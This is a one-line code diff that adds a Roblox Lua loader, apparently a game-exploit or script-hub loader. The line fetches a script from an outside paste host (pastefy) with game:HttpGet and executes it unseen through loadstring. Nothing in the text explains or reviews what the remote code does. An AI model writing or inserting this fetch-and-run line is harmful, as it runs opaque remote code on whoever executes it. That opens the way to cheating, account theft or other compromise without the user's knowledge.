@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://api.pastefy.lol/files/v4/loaders/531d42e71ae642de8af7169ebc9a0ee7.lua"))()
